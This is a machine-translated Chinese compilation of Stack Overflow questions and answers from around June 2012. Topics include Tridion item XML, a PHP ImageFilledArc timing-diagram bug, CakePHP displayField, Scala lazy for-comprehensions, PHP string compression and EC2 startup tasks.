# StackOverflow 问答 10991000-10991999

# tridion - 如何在 SDL Tridion 中获取任何对象的 XML 结构

> ID：10991001
> 
> 赞同：3
> 
> 时间：2012-06-12T05:32:42.057
> 
> 标签：tridion, tridion-2011

如何获取 Tridion 中项目的 XML 结构（如模式、组件、复合模板、关键字、类别、文件夹等）？

它是在 Tridion 的安装文件夹中还是在其他任何地方？或者有什么方法可以直接从 Tridion UI 访问它？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-12T08:33:36.863

这是您可以在浏览器控制台中运行以实现此目的的最简单的代码段：

```
var itemUri = "tcm:...";
var item = $models.getItem(itemUri);
if(item)
{
   if(item.isStaticLoaded())
   {
      console.log(item.getStaticXml());
   }
   else
   {
      $evt.addEventHandler(item, "staticload", function() {
         console.log(item.getStaticXml());
      });
     item.staticLoad();
   }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-29T18:11:21.093

如果使用 CoreService，您还可以使用以下代码获取项目的 XML：

```
public XmlElement ToR6Xml()
{
    DataContractSerializer dcs = new DataContractSerializer(ComponentData);
    using(MemoryStream stream = new MemoryStream())
    {
        dcs.WriteObject(stream, CurrentData);
        stream.Position = 0;
        XmlDocument document = new XmlDocument();
        document.Load(stream);
        return document.DocumentElement;
    }
} 
```

然而，这将返回 Tridion“R6”Xml，与通过 TOM.NET 或协议处理程序（“R5”xml）公开的不同。

ñ

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-06-12T09:14:33.473

您也可以使用协议处理程序。如果您在内容管理服务器上登录，只需启动 Internet Explorer 并在地址栏中输入 uri。它将显示任何项目的 XML 表示。但是：这不适用于 64 位版本的 IE 9（请参阅另一个最近的线程）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-21T07:12:11.350

还有两种快速获取组件 XML 的方法，这次是通过模板。

**注意：请小心依赖项目的原始来源，尤其是当我们有支持的 API 时。**

## XSLT 组件模板

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
    xmlns:generic="http://createandbreak.net/schema/generic" 
    xmlns:tcm="http://www.tridion.com/ContentManager/5.0"
    xmlns:xlink="http://www.w3.org/1999/xlink"
    exclude-result-prefixes="xsl tcm xlink generic">

    <xsl:output omit-xml-declaration="no" indent="yes"
        method="xml" cdata-section-elements="description" />
    <xsl:variable name="Content" select="/tcm:Component/tcm:Data/tcm:Content" />

    <xsl:template match="/">
        <xsl:copy-of select="." />
        <xsl:apply-templates select="$Content/*" />
     </xsl:template>

    <xsl:template match="*">
        <xsl:copy-of select="." />
    </xsl:template>
</xsl:stylesheet> 
```

## C# 程序集模板构建块 (TOM.NET)

```
using Tridion.ContentManager.ContentManagement;
using Tridion.ContentManager.Templating; 
using Tridion.ContentManager.Templating.Assembly;

namespace CreateAndBreakTemplates
{
    [TcmTemplateTitle("Show XML Guts")]
    public class ShowXmlGuts : ITemplate
    {
        public void Transform(Engine engine, Package package)
        {
            Item contentItem = package.GetByType(ContentType.Component);
            Component component = engine.GetObject(contentItem.GetAsSource().GetValue("ID")) as Component;
            package.PushItem("componentSource", package.CreateHtmlItem(component.Content.OuterXml));
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-12T22:14:58.447

正如 Quirijn 所指出的，使用协议处理程序是一种最喜欢的技术。另外 - 如果您使用的是 Tridion 2011，那么来自[http://code.google.com/p/tridion-2011-power-tools/](http://code.google.com/p/tridion-2011-power-tools/)的 Item Xml 扩展也非常有用。

如果您使用的是旧版本的 Tridion，您可能还想尝试将 UI 设置为调试模式并以这种方式检查 XML。

# ios - iOS 捆绑包 ID 计数和链接到一个 Facebook 应用 ID 的 URL 方案后缀计数的限制

> ID：10991007
> 
> 赞同：0
> 
> 时间：2012-06-12T05:33:17.863
> 
> 标签：ios, facebook

> **可能重复：**
> [可以为原生 iOS 应用程序指定的捆绑包 ID 的数量是否有限制？](https://stackoverflow.com/questions/10506336/is-there-a-limit-to-the-number-of-bundle-ids-that-one-can-specify-for-native-io)

我正在开发一个必须连接到单个 Facebook 应用程序 ID 的 iOS SDK。使用此 SDK 的开发人员将被分配各自的 iOS 捆绑包 ID 和链接到应用程序 ID 的 URL 方案后缀。

鉴于可能有大量开发人员使用此 SDK，对于可以链接到一个 Facebook 应用程序 ID 的 iOS 捆绑包 ID 和 URL 方案后缀的数量是否有任何理论上的限制？

# java - 使用后退按钮时显示标签分页不起作用

> ID：10991010
> 
> 赞同：0
> 
> 时间：2012-06-12T05:33:22.937
> 
> 标签：java, jsp, displaytag

我在 page1.jsp 中使用分页，并且我有指向 page2.jsp 的链接。我在 pag2.jsp 中有后退按钮 我在 page1.jsp 中的分页 =2 如果我单击指向 page2.jsp 的链接并返回到 page1.jsp 它显示 page1.jsp 与 pagination=1 任何人都可以帮助配置分页跨页

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:41:58.863

您必须在某个范围内存储寻呼机的索引，因为它是外部请求，它应该是会话。

当用户从 page1 移动到 page2 时，保存寻呼机的索引。

当您加载 page1.jsp 的寻呼机时，请查看会话中是否存在有效索引，如果不加载默认值，则根据值设置寻呼机索引。

您将必须检查如何根据您的分页插件逻辑来编写它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-21T13:26:29.973

使用物业

```
keepStatus="true" 
```

在 display:table 声明中。

# jquery - 如何实现列表的块样式

> ID：10991013
> 
> 赞同：0
> 
> 时间：2012-06-12T05:33:24.917
> 
> 标签：jquery, css, html-lists, haml

我有以下 HAML 代码

```
//haml code for template
.activities_section
  %ul.row_one
    %li
      %a{href: "#"} lol
    %li
      %a{href: "#"} watched a movie
    %li
      %a{href: "#"} read a book
    %li
      %a{href: "#"} happy
    %li
      %a{href: "#"} sad

//CSS for section
.activities_section {
  width: 220px;
  height: 176px;
  border-left:$base_border;
  border-right:$base_border;
  border-bottom:$base_border;
  border-top:$base_border;
  background: $light_background_color;
  ul {
    list-style: none;
    display: block;
    padding: 0;
    margin: 0;
    li {
      padding: 5px;
      font-size: 0.8em;
      // text-align: center;
    }
  }
}

//How it looks like currently 
```

![在此处输入图像描述](../Images/796a3c41e15f1050f5dd9febb3c6731f.png)

```
//How I want it to look like 
```

![在此处输入图像描述](../Images/8b48f0f24cf6a0f2b621b8d96d5fba0e.png)

如何更新我的 css 以使列表处于最后一张图片中看到的“块样式”？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T05:35:57.020

```
li {
      padding: 5px;
      font-size: 0.8em;
      text-align: center;
      border-radius: 6px;
      background: #ccc;
      display: inline-block;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T05:48:20.283

我想你需要这样

[http://jsfiddle.net/miqdad/uwLK7/](http://jsfiddle.net/miqdad/uwLK7/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T05:44:16.987

试试这个：

```
ul li {
  padding: 3px 4px;
  font-size: 0.8em;
  text-align: center;
  border-radius: 8px;
  display: inline-block;
  color: blue;
  background-color: #ededed;
} 
```

# c# - 在 NHibernate 日志输出中省略 blob 列

> ID：10991015
> 
> 赞同：0
> 
> 时间：2012-06-12T05:33:35.097
> 
> 标签：c#, nhibernate, logging, log4net, blob

我想在 NHibernate 日志文件中打印出没有某些 blob 类型列内容的 SQL 语句，这真的填满了空间，使整个事情变得不可读。

这是否可能以某种方式，例如在记录的列上应用过滤器？也许另一个选项可能是设置打印字符数的限制。

更新：NHibernate 版本是 3.1.0.4000。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T05:42:46.440

您使用的是哪个版本的 NHibernate？从 3.2.0.Alpha1 开始，NHibernate 将字符串截断为 1000 个字符，字节数组（blob）截断为 128 个字节。

# scala - scala中对理解评估的懒惰

> ID：10991017
> 
> 赞同：4
> 
> 时间：2012-06-12T05:33:42.107
> 
> 标签：scala, functional-programming, immutability, lazy-evaluation, for-comprehension

我是 scala 和大多数函数式语言的新手，我目前正在尝试计算一个数字。我已经写了代码：

```
lazy val factors = for(int <- 2 until  math.ceil(math.sqrt(number)).toInt if number%int == 0) yield int 
```

我想知道如果我将 scala val 声明为惰性，它会不会在我调用时评估整个理解`factors.head`？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-12T05:43:15.853

你的`factors`变量是懒惰的；`for`理解不是。当您第一次访问`factors`时，您的`for`理解力将得到全面评估。

在 Scala 中，`for`理解只是`flatMap`、`map`和`withFilter`方法调用的糖。因此，如果您的支持数据结构是严格的（例如`Range`- 这是您正在使用的），您的`for`理解也将是严格的。如果数据结构是惰性的（例如`Stream`），那么`for`理解也是。

观察差异：

```
scala> val number = 50
number: Int = 50

scala> lazy val factors = for(int <- 2 until  math.ceil(math.sqrt(number)).toInt if number%int == 0) yield int
factors: scala.collection.immutable.IndexedSeq[Int] = <lazy>

scala> factors.head
res5: Int = 2

scala> factors
res6: scala.collection.immutable.IndexedSeq[Int] = Vector(2, 5)

scala> lazy val factors = for(int <- Stream.range(2, math.ceil(math.sqrt(number)).toInt - 1) if number%int == 0) yield int
factors: scala.collection.immutable.Stream[Int] = <lazy>

scala> factors.head
res7: Int = 2

scala> factors
res8: scala.collection.immutable.Stream[Int] = Stream(2, ?) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T05:43:01.873

不，这是完全不同的事情：`lazy`意味着该值是在您第一次访问它时计算的。如果你想对集合进行惰性计算，你应该使用[`Stream`](http://www.scala-lang.org/api/current/index.html#scala.collection.immutable.Stream)或使用视图。A`Stream`可以使用`view`.

# php - ImageFilledArc 在 PHP 5.x 下失败

> ID：10991023
> 
> 赞同：0
> 
> 时间：2012-06-12T05:34:49.917
> 
> 标签：php

我有一个复杂的 PHP 片段，它使用 ImageFilledArc 绘制一个 2 冲程发动机时序图。它在 php 5.2 下工作了多年，但我的 ISP 已将服务器升级到 PHP 5.3，并且不再呈现弧线。下图显示了发生的情况以及预期的情况。

![在此处输入图像描述](../Images/35c25d4e74d0f8e26248bbd3b6be4aee.png)

测试表明该函数将 FAIL（零）返回到“样式”的所有值。实验表明 ImageFilledRectangle 按预期工作（代码插入到程序中，因此它使用相同的目标 GD 图像实例和颜色值）。

网络搜索未发现任何提及 PHP 转换文档中任何图形函数的更改，也未发现任何其他人对此函数有问题。下面提供了绘制图形的代码。调用它的代码不是，但可以通过调用完全没有 args 的页面来测试它。

```
<?php
/*
 * Creats a PNG image of the MBI CAD standard timing 2-stroke diagram.
 *
 * Created on Aug 10, 2007 by Ronald A Chernich, Brisbane, Australia.
 * This work is licensed under the Creative Commons
 * Attribution-Noncommercial-Share Alike 3.0 license.
 * See: http://creativecommons.org/licenses/by-nc-sa/3.0
 *
 * 2007-08-08 1.0   First version
 * 2007-08-13 1.1   Add FRV labeling adjustment
 * 2007-08-15 1.2   Add SPI capability and blow-down
 * 2007-08-15 1.2.1 Revise SPI representation to Inlet side of graph
 * 2007-08-25 1.2.2 SPI and inlet labels overlapped in some cases. Fixed.
 */

  $eo = $_GET['eo'];
  $to = $_GET['to'];
  $ic = $_GET['ic'];
  $id = $_GET['id'];
  $nm = $_GET['nm'];
  $spi = $_GET['spi'];

  // Test data for development
  if (empty($nm)) {
    $nm = 'Test';
    $eo = 108;
    $to = 123;
    $ic = 15;
    $id = 140;
  }

  $graph = new TimingDiagram($nm, $eo, $to, $ic, $id, $spi);
  $graph->render();

/**
 * Class to render image
 */
class TimingDiagram
{
    var $WIDTH = 420;
    var $HEIGHT = 420;
    var $YMARGIN = 30;
    var $XMIN = 2;
    var $YMIN = 2;

    var $BG_COLOR;
    var $IN_COLOR;
    var $TR_COLOR;
    var $EX_COLOR;
    var $LAP_COLOR;
    var $AXIS_COLOR;
    var $TITLE_COLOR;

    var $image;

    var $eo;
    var $to;
    var $ic;
    var $id;
    var $spi;
    var $arc;
    var $title;
    var $degChar;

    function TimingDiagram ($title, $eo, $to, $ic, $id, $spi)
    {
      $this->title = $title;
      $this->eo = $eo;
      $this->to = $to;
      $this->ic = $ic;
      $this->id = $id;
      $this->spi = $spi;

      $this->degChar = '°';
      $this->image = ImageCreateTruecolor($this->WIDTH, $this->HEIGHT);
      $this->InitColors();

      $this->arc_y = $this->HEIGHT / 12;

      $xmax = $this->WIDTH - (2 * $this->XMIN);
      $ymax = $this->HEIGHT - (2 * $this->YMIN);
      ImageFilledRectangle($this->image, $this->XMIN, $this->YMIN,
                           $xmax, $ymax, $this->BG_COLOR);
    }

    function initColors ()
    {
      $this->BG_COLOR = ImageColorAllocate($this->image, 255, 255, 255);
      $this->TITLE_COLOR = ImageColorAllocate($this->image, 0, 0, 120);
      $this->AXIS_COLOR = ImageColorAllocate($this->image, 200, 200, 200);

      $this->IN_COLOR = ImageColorAllocate($this->image, 180, 180, 180);
      $this->TR_COLOR = ImageColorAllocate($this->image, 120, 120, 120);
      $this->EX_COLOR = ImageColorAllocate($this->image, 80, 80, 80);
      $this->LAP_COLOR = ImageColorAllocate($this->image, 140, 140, 140);
    }

    function render ()
    {
      $x0 = $this->WIDTH  / 2;
      $y0 = $this->HEIGHT  / 2;
      $this->drawTitle($x0, $y0);
      $this->drawSPI($x0, $y0);
      $this->drawExhaust($x0, $y0);
      $this->drawInlet($x0, $y0);
      $this->drawSPI($x0, $y0);
      $this->drawTransfer($x0, $y0);
      $this->drawRot($x0, $y0);
      Header("Content-type: image/png");
      ImagePng($this->image);
      ImageDestroy($this->image);
    }

    function drawTitle ()
    {
      $st = "Timing Diagram for $this->title.";
      $fnt = 5;
      $dx = ($this->WIDTH - (ImageFontWidth($fnt) * strlen($st))) / 2;
      $dy = ($this->YMARGIN - ImageFontHeight($fnt)) / 2;
      imagestring($this->image, $fnt, $dx, $dy, $st, $this->TITLE_COLOR);
    }

    function drawSPI ($x0, $y0)
    {
      if (is_numeric($this->spi)) {
        $end = 270 - $this->spi;
        $start = 270 + $this->spi;
        $dx1 = .64 * $this->WIDTH;
        $dy1 = .64 * $this->HEIGHT;
        $dim = $this->arc_y * .75;
        $dx2 = $dx1 - $dim;
        $dy2 = $dy1 - $dim;
        ImageFilledArc($this->image, $x0, $y0, $dx1, $dy1, $end, $start,
                       $this->IN_COLOR, IMAGE_ARC_PIE);
        $res = ImageFilledArc($this->image, $x0, $y0, $dx2, $dy2, $end-1, $start+1,
                       $this->BG_COLOR, IMAGE_ARC_PIE);

        $x = $this->WIDTH * 0.1;
        $y = $this->HEIGHT * (($this->ic > 29) ? 0.3 : 0.2);
        $this->labelEvent($x, $y, "SPI ends", "ATDC", $this->spi);
        $this->labelEvent($this->WIDTH - $x, $y, "SPI starts", "ABDC",
                         (180 - $this->spi));
        // Drawing SPI will have trashed the Inlet duration label
        $fnt = 3;
        $id = (empty($this->id) ? (2 * $this->ic) : $this->id);
        $lab = sprintf('Inlet %.0f%s', $id, $this->degChar);
        $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab)) / 2);
        $dy = ($y0 - (.22 * $this->HEIGHT) - ImageFontHeight($fnt));
        Imagestring($this->image, $fnt, $dx, $dy, $lab, $this->TITLE_COLOR);
        $lab = sprintf('with %.0f%s', $this->spi * 2, $this->degChar);
        $dy += ImageFontHeight($fnt);
        $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab)) / 2);
        Imagestring($this->image, $fnt, $dx, $dy, $lab, $this->TITLE_COLOR);
        $lab = 'sub-piston induction';
        $dy += ImageFontHeight($fnt);
        $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab)) / 2);
        Imagestring($this->image, $fnt, $dx, $dy, $lab, $this->TITLE_COLOR);
      }
    }

    function drawExhaust ($x0, $y0)
    {
      if ($this->eo > 0) {
        $ex = 180 - $this->eo;
        $eo = 90 + $ex;
        $ec = 90 - $ex;
        $dx1 = .8 * $this->WIDTH;
        $dy1 = .8 * $this->HEIGHT;
        $dx2 = $dx1 - $this->arc_y;
        $dy2 = $dy1 - $this->arc_y;
        ImageFilledArc($this->image, $x0, $y0, $dx1, $dy1, $ec, $eo,
                       $this->EX_COLOR, IMAGE_ARC_PIE);
        ImageFilledArc($this->image, $x0, $y0, $dx2, $dy2, $ec-1, $eo+1,
                       $this->BG_COLOR, IMAGE_ARC_PIE);

        $fnt = 3;
        $lab = sprintf('Exhaust %.0f%s', (2 * $ex), $this->degChar);
        $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab)) / 2);
        $dy = ($y0 + (.46 * $this->HEIGHT) - ImageFontHeight($fnt));
        Imagestring($this->image, $fnt, $dx, $dy, $lab, $this->TITLE_COLOR);

        $x = $this->WIDTH * 0.12;
        $y = $this->HEIGHT * 0.86;
        $this->labelEvent($x, $y, "Exhaust opens", "ATDC", $this->eo);
        $this->labelEvent($this->WIDTH - $x, $y, "Exhaust closes", "ABDC",
                          180 - $this->eo);
      }
    }

    function drawTransfer ($x0, $y0)
    {
      if ($this->to > 0) {
        $tr = 180 - $this->to;
        $to = 90 + $tr;
        $tc = 90 - $tr;
        $dx1 = .7 * $this->WIDTH;
        $dy1 = .7 * $this->HEIGHT;
        $dx2 = $dx1 - $this->arc_y;
        $dy2 = $dy1 - $this->arc_y;
        ImageFilledArc($this->image, $x0, $y0, $dx1, $dy1, $tc, $to,
                       $this->TR_COLOR, IMAGE_ARC_PIE);
        ImageFilledArc($this->image, $x0, $y0, $dx2, $dy2, $tc-1, $to+1,
                       $this->BG_COLOR, IMAGE_ARC_PIE);

        // Special case where FRV inlet overlaps transfer close
        if (!empty($this->id)) {
          $io = ($this->id - $this->ic) - 90;
          if ($io > $tc) {
            ImageFilledArc($this->image, $x0, $y0, $dx1, $dy1, $tc, $io,
                           $this->LAP_COLOR, IMAGE_ARC_PIE);
            ImageFilledArc($this->image, $x0, $y0, $dx2, $dy2, $tc-1, $io+1,
                           $this->BG_COLOR, IMAGE_ARC_PIE);
          }
        }
        $fnt = 3;
        $lab = sprintf('Transfer %.0f%s', (2 * $tr), $this->degChar);
        $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab)) / 2);
        $dy = ($y0 + (.25 * $this->HEIGHT) - ImageFontHeight($fnt));
        Imagestring($this->image, $fnt, $dx, $dy, $lab, $this->TITLE_COLOR);

        $x = $this->WIDTH * 0.35;
        $y = $this->HEIGHT * 0.65;
        $this->labelEvent($x, $y, "Transfer opens", "ATDC", $this->to);
        $this->labelEvent($this->WIDTH - $x, $y, "Transfer closes", "ABDC",
                          180 - $this->to);
      }
    }

    function drawInlet ($x0, $y0)
    {
      if (is_numeric($this->ic)) {
        $ic = 270 - $this->ic;
        $id = (is_numeric($this->id) ? $this->id : 2 * $this->ic);
        $io = $ic + $id;
        $dx1 = .7 * $this->WIDTH;
        $dy1 = .7 * $this->HEIGHT;
        $dx2 = $dx1 - $this->arc_y;
        $dy2 = $dy1 - $this->arc_y;
        ImageFilledArc($this->image, $x0, $y0, $dx1, $dy1, $ic, $io,
                       $this->IN_COLOR, IMAGE_ARC_PIE);
        ImageFilledArc($this->image, $x0, $y0, $dx2, $dy2, $ic-2, $io+2,
                       $this->BG_COLOR, IMAGE_ARC_PIE);

        $fnt = 3;
        $id = (empty($this->id) ? (2 * $this->ic) : $this->id);
        $lab = sprintf('Inlet %.0f%s', $id, $this->degChar);
        $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab)) / 2);
        $dy = ($y0 - (.22 * $this->HEIGHT) - ImageFontHeight($fnt));
        Imagestring($this->image, $fnt, $dx, $dy, $lab, $this->TITLE_COLOR);

        $x = $this->WIDTH * 0.13;
        $y = $this->HEIGHT * 0.2;
        $isBTDC = $this->ic < 0;
        $tag = $isBTDC ? 'BTDC' : 'ATDC';
        if ($isBTDC || ($this->ic < 30)) {
          $x = $this->WIDTH -
               ($isBTDC ? ($this->WIDTH * 0.3) : ($this->WIDTH * 0.65));
          $y = $this->HEIGHT * 0.12;
        }
        $this->labelEvent($x, $y, "Inlet closes", $tag, abs($this->ic));

        $x = $this->WIDTH * 0.13;
        $y = $this->HEIGHT * 0.2;
        if ($isBTDC || ($this->ic < 30)) {
        $x = $this->WIDTH * 0.1;
          $y = $this->HEIGHT * 0.3;
        }
        $tmp = (is_numeric($this->id)) ? ($this->id - $this->ic) : $this->ic;
        $this->labelEvent($this->WIDTH-$x, $y, "Inlet opens", "ABDC", 180-$tmp);
      }
    }

    function labelEvent ($x0, $y0, $lab1, $st2, $angle)
    {
      $fnt = 2;
      $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab1)) / 2);
      $dy = $y0 - ImageFontHeight($fnt);
      Imagestring($this->image, $fnt, $dx, $dy, $lab1, $this->TITLE_COLOR);
      $lab2 = sprintf('%.1f%s %s', $angle, $this->degChar, $st2);
      $dx = ($x0 - (ImageFontWidth($fnt) * strlen($lab2)) / 2);
      Imagestring($this->image, $fnt, $dx, $y0, $lab2, $this->TITLE_COLOR);
    }

    function drawRot ($x0, $y0)
    {
      $xtick = $this->WIDTH / 30;
      ImageLine($this->image,
                $x0 - $xtick, $y0, $x0 + $xtick, $y0,
                $this->AXIS_COLOR);
      $ytick = $this->HEIGHT / 28;
      ImageLine($this->image,
                $x0, $y0 + $ytick, $x0, $y0 - (2 * $ytick),
                $this->AXIS_COLOR);
      $xrad = $this->WIDTH / 8;
      $yrad = $this->HEIGHT / 8;
      ImageArc($this->image,
               $x0, $y0, $xrad, $yrad, 270, 180, $this->AXIS_COLOR);
      $ahx = $xrad / 8;
      $ahy = $yrad / 15;
      $dy = ($yrad / 2) - ($ahy / 2);
      $points = array(($x0 - $ahx), ($y0 - $dy),
                      ($x0 + $ahx), ($y0 - $dy - $ahy),
                      ($x0 + $ahx), ($y0 - $dy + $ahy),
                      ($x0 - $ahx), ($y0 - $dy));
      ImageFilledPolygon($this->image, $points, 4, $this->AXIS_COLOR);
      $lab = "TDC";
      $fnt = 3;
      $tx = ($x0 - (ImageFontWidth($fnt) * strlen($lab)) / 2);
      $ty = ($y0 - ( .6 * $yrad) - ImageFontHeight($fnt));
      Imagestring($this->image, $fnt, $tx, $ty, $lab, $this->TITLE_COLOR);

      if (($this->eo > 0) && ($this->to> 0) ) {
        $x = $this->WIDTH * 0.092;
        $y = $this->HEIGHT * 0.93;

        $this->labelEvent($x, $y, 'Blowdown:', '', ($this->to - $this->eo));
      }
    }

} 
```

?>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:25:40.487

在文档（[http://us2.php.net/manual/fr/function.imagefillarc.php](http://us2.php.net/manual/fr/function.imagefilledarc.php)）中，他们使用**IMG_ARC_PIE**而不是**IMAGE_ARC_PIE**。

我用 PHP 5.3.8 替换后尝试，我得到了这个结果： ![在此处输入图像描述](../Images/db19d3c60a22e0eea719286856abd709.png)

# cakephp - Cakephp displayField .. 模型中不止一个

> ID：10991026
> 
> 赞同：1
> 
> 时间：2012-06-12T05:34:58.160
> 
> 标签：cakephp

这另一个问题

[在脚手架 Cakephp 中显示 ID 以外的其他内容](https://stackoverflow.com/questions/9817887/showing-something-other-than-id-in-scaffold-cakephp)

已在此处和其他地方的许多地方得到回答，并处理我想要一个选择列表但要显示的文本字段而不是 id 未命名为“名称”的情况。显然，如果您通过在其模型中添加以下内容来告诉它该字段被命名为“名称”而不是“名称”，Cake 可以处理此问题：

```
var $displayField = 'NonNameName'; 
```

然而，所有的例子都是一个选择。但是我有三个选择列表，那么如何添加它们？当然，我不能按照以下代码所示进行操作（例如，三行 "var $displayField = "...";" .. 拥有三个 $displayField .. 没有意义。

```
<?php
App::uses('AppModel', 'Model');
/**
 * Visit Model
 *
 * @property User $User
 * @property Referrer $Referrer
 * @property Company $Company
 */
class Visit extends AppModel {

    //The Associations below have been created with all possible keys, those that are not needed can be removed

/**
 * belongsTo associations
 *
 * @var array
 */

var $displayField = 'location';
var $displayField = 'referrer';
var $displayField = 'company';

    public $belongsTo = array(
        'User' => array(
            'className' => 'User',
            'foreignKey' => 'user_id',
            'conditions' => '',
            'fields' => '',
            'order' => ''
        ),
        'Referrer' => array(
            'className' => 'Referrer',
            'foreignKey' => 'referrer_id',
            'conditions' => '',
            'fields' => '',
            'order' => ''
        ),
        'Location' => array(
            'className' => 'Location',
            'foreignKey' => 'location_id',
            'conditions' => '',
            'fields' => '',
            'order' => ''
        ),      
        'Company' => array(
            'className' => 'Company',
            'foreignKey' => 'company_id',
            'conditions' => '',
            'fields' => '',
            'order' => ''
        )
    );
} 
```

在我的控制器中，我有

```
$companies= $this->Visit->Company->find('list');
$locations = $this->Visit->Location->find('list', array('conditions' => array('company_id' => $this->Auth->user('company_id'))));
$referrers = $this->Visit->Referrer->find('list', array('conditions' => array('company_id' => $this->Auth->user('company_id'))));   
    $this->set(compact('locations','referrers','companies')); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-11-06T17:26:34.677

在 CakePHP 3.x 中，最好的、有文档的和优雅的方法是：

https://book.cakephp.org/3.0/en/orm/retrieving-data-and-resultsets.html#customize-key-value-output

可以使用闭包来访问列表中的实体访问器方法，如下所示：

```
// In your Authors Entity create a virtual field to be used as the displayField:
protected function _getLabel()
{
    return $this->_properties['first_name'] . ' ' . $this->_properties['last_name']
      . ' / ' . __('User ID %s', $this->_properties['user_id']);
} 
```

然后您可以直接使用以下方法在列表查找器中获取标签：

```
// In AuthorsTable::initialize():
$this->setDisplayField('label'); // Will utilize Author::_getLabel()
// In your finders/controller:
$query = $authors->find('list'); // Will utilize AuthorsTable::getDisplayField()
// In your views:
$author->label // will display : John Doe / User ID 123 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T20:05:30.377

我想你的意思是这样的：

```
// controller/action
$locations = $this->Visit->Location->find('list');
$referrers = $this->Visit->Referrer->find('list');
$companies = $this->Visit->Company->find('list');
$this->set(compact('locations', 'referrers', 'companies')); 
```

在你看来：

```
echo $this->Form->input('location_id');
echo $this->Form->input('referrer_id');
echo $this->Form->input('company_id'); 
```

那（应该）产生三个选择 - 模仿`display-field`你所追求的行为。

引用蛋糕：

> find('list', $params) 返回一个索引数组，可用于任何需要列表的用途，例如填充输入选择框。

[http://book.cakephp.org/1.3/view/1022/find-list](http://book.cakephp.org/1.3/view/1022/find-list)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-06T07:11:57.750

在 CakePHP 3.x 中：

打开你的 App/Model/Table/Your_Table.php

```
public function initialize(array $config) {
    $this->displayField(['full_name', 'email']);
} 
```

当您检索列表时：

```
TableRegistry::get('Your')->find('list'); 
```

结果将是：

```
[
    [key => 'full_name;email'],
    [key => 'full_name;email'],
]; 
```

# php - 在 PHP 中压缩字符串的最佳方法

> ID：10991035
> 
> 赞同：15
> 
> 时间：2012-06-12T05:36:10.547
> 
> 标签：php, string, compression

我正在使用 gzcompress(json_encode($arr),9) 压缩数组。所以我用 json_encode 将数组转换为字符串，然后用 gzcompress 压缩。但我找不到结果字符串的大小有太大差异。压缩前大小为 488 KB，压缩后大小为 442 KB。

有什么办法可以进一步压缩字符串吗？

提前致谢。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-06-12T06:08:06.363

我不确定您的数字是否正确，但您可以使用`gzdeflate`而不是`gzcompress`as`gzcompress`在输出中添加 6 个字节（开头有 2 个额外字节，结尾有 4 个额外字节）。

一个简单的测试显示一个长度为 1756800 的字符串通过双重压缩压缩为 99 个字节，如果压缩一次则为 5164 个字节。

```
$string = str_repeat('1234567890' . implode('', range('a', 'z')), 48800);

echo strlen($string); //1756800 bytes

$compressed = gzdeflate($string,  9);
$compressed = gzdeflate($compressed, 9);

echo strlen($compressed); //99 bytes

echo gzinflate(gzinflate($compressed)); 
```

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-06-12T05:44:20.240

字符串的压缩程度取决于您要压缩的数据。如果它主要由随机数据组成，那么您将不会在大小上取得那么大的改进。有许多算法是为特定用途而设计的。

您应该尝试确定要压缩的数据主要包含哪些内容，然后选择适当的压缩方式。

刚才我只能给你[推荐 bzcompress](http://php.net/manual/en/function.bzcompress.php)，bzip 的压缩率通常比 gzip 高。

# amazon-ec2 - 启动 Amazon EC2 实例时启动应用程序

> ID：10991041
> 
> 赞同：3
> 
> 时间：2012-06-12T05:36:49.063
> 
> 标签：amazon-ec2, amazon

我在 Windows 启动文件夹中添加了一个应用程序的快捷方式。当我创建一个 Amazon EC2 实例（使用我自己的从 win server 2008 64 位派生的 AMI）并使用远程桌面从 AWS 控制台连接到它时，它工作正常：一旦在远程桌面中加载 Windows，我的应用程序就会按预期启动。

但是，如果我不使用远程桌面连接到 EC2 实例，我的应用程序将无法启动。我可以说，因为当启动时，应用程序会将消息发送到一个队列，我可以从我的台式计算机检查该队列。

我的理解是，无论我是否使用远程桌面连接到 EC2 实例，它都应该运行。不是这样吗？我在这里误解了什么吗？理想情况下，我希望能够启动多个实例并让它们在启动时运行一个应用程序，该应用程序执行一些计算，而无需使用远程桌面手动和单独连接到每个实例以启动该特定应用程序。这不可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T21:21:06.897

已解决：事实证明，我需要将任务添加到 Windows Server 2008 中的任务计划程序，并将触发器设置为在操作系统启动时启动应用程序，而不是等待用户登录。

# java - 在java中制作一个分割字符串的方法

> ID：10991045
> 
> 赞同：0
> 
> 时间：2012-06-12T05:37:23.487
> 
> 标签：java, math

我有一个名为：ComplexNumber 的类，我有一个字符串，我需要将其转换为 ComplexNumber（使用 Java）。

如果我有：“5+3i”或“6-2i”，我该如何正确解析这些字符串。我需要把它变成 2 个变量，剩下的我可以做。

```
String complexNum = "5+3i"; 
```

我需要将前一个字符串拆分为两个双精度类型变量 double real = 5;
双图像 = 3;

```
String complexNum = "6-2i"; 
```

我需要将前一个字符串拆分为两个双精度类型变量 double real = 6; 双图像 = -2;

